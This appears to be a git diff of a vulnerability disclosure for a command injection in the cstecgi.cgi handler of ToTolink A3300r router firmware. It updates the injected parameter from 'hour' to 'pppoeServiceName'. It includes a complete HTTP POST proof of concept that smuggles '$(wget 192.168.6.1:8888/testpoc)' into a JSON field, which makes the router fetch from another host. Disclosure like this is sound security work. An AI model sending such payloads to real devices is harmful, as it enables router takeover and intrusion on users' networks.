@@ -4,6 +4,10 @@ Vendor:ToTolink
 
 Product:A3300r
 
+Affected Version: V17.0.0cu.557_B20221024
+
+Firmware Download: https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html
+
 Vulnerability: Command Injection
 
 Type:Command Injection Attack
@@ -16,9 +20,9 @@ Type:Command Injection Attack
 We found a command injection vulnerability  in `cstecgi.cgi` that could be triggered by an attacker through carefully crafted packet requests:
 
 
-<div  align="center"><img src="./img/schedule-hour-sub_414614.png" style="zoom:80%;" /></div>
+<div  align="center"><img src="./img/pppoe-service-name-sub_422380.png" style="zoom:80%;" /></div>
 
-The sub_414614 function defines a variable `hour`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
+The sub_422380 function defines a variable `pppoeServiceName`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
 
 <div  align="center"><img src="./img/uci_set_str.png" style="zoom:80%;" /></div>
 
@@ -31,7 +35,7 @@ However,the CsteSystem function wraps the command and then passes it to execv to
 
 ## Proof of Concept (PoC)
 
-We set `hour` as **1$(wget 192.168.6.1:8888/testpoc)"** ,such as:
+We set `pppoeServiceName` as **$(wget 192.168.6.1:8888/testpoc)** ,such as:
 
 ```http
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
@@ -47,8 +51,8 @@ Referer: http://192.168.6.2/wizard.html?token=
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
-{"mode":"1","hour":"1$(wget 192.168.6.1:8888/testpoc)","minute":"14","week":"64","recHour":"","topicurl":"setScheduleCfg"}
+{"dnsAutoFake":"1","lanAutoFake":"1","wanDhcp":"2","wanPriv":"0","lanRadvFake":"1","lanDhcp":"1","pppoeUser":"yy","pppoePass":"1234","pppoeServiceName":"$(wget 192.168.6.1:8888/testpoc)","pppoeMtu":"1492","service":"pppoe6","topicurl":"setIpv6Cfg"}
 ```
 
 ## outcome
-<div  align="center"><img src="./img/poc-hour.png" style="zoom:80%;" /></div>
+<div  align="center"><img src="./img/poc-pppoe-service-name.png" style="zoom:80%;" /></div>
